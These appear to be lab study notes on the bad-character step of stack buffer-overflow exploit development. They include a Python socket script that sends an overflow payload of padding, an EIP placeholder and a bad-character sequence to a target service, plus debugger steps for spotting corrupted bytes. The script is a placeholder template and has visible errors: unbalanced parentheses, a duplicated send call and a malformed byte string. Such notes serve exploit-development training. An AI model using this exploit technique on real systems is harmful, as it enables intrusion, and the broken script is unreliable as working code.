Find which characters cause problems in the program
 
Run Immunity Debugger
 
Tool:  
[https://github.com/cytopia/badchars](https://github.com/cytopia/badchars)  
Copy the badchars = (……) section under Python
   

### Gedit 4.py

#!/usr/bin/python3  
import sys, socket
 
badchars = ("<\x01\......((from_badchars_link))")
 
shellcode = "A" * <offset> + "B" * 4 + badchars
 
try:  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("<IP>",<PORT>))  
payload = "<Cmd_to_overflow> /.:/" + shellcode))  
s.send((payload.encode()))
 
s.send((payload.encode()))
 
s.close()
 
except:  
print("Error connecting to server")  
sys.exit()
 
### chmod +x 4.py

### ./4.py
 
Analyze Immunity to look for any anomolies
 
Right click ESP value, follow in dump
 
Look for any character out of place in the hex dump, write them down
 
For example, 01 02 03 B0 B0 06 (4 and 5 are bad characters)  
Might be multiple sets of bad characters, write them down
 
((Technically, if you have consecutive bad characters, only the first character is bad, the rest of still good, bu tyou can take them all out to be sure))

You can delete \x00\ because it default causes error